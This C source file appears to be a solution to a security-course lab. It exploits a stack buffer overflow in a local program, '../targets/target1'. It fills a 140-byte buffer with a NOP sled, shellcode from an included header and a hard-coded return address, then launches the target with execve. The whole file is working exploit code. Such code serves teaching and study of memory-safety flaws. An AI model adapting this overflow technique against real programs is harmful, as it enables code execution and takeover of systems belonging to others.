#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define BUFFER_SIZE 140
#define NOP 0x90
#define TARGET_ADDRESS 0x40a4fe08
/*
 *	&buf 		   = 0x40a4fe00
 *	rip(lab_main)  = 0x40a4fe88
 *  return address = 0x40a4fe08
 *
 *  attack buffer  = [NOP][Shellcode][Return Address]
 */
int
main ( int argc, char * argv[] )
{
        char *  args[3];
        char *  env[1];

        char buff[BUFFER_SIZE];

        int i;
        for (i = 0; i < BUFFER_SIZE - strlen(shellcode) - 4; i++)
        {
                buff[i] = NOP;
        }

        char *ptr = buff + BUFFER_SIZE - strlen(shellcode) - 4;
        for (i = 0; i < strlen(shellcode); i++)
        {
                ptr[i] = shellcode[i];
        }
		

        *(int *) & buff[BUFFER_SIZE - 4] = TARGET_ADDRESS;

        args[0] = TARGET;
        args[1] = buff;
        args[2] = NULL;

        env[0] = NULL;

        if ( execve (TARGET, args, env) < 0 )
                fprintf (stderr, "execve failed.\n");

        return (0);
}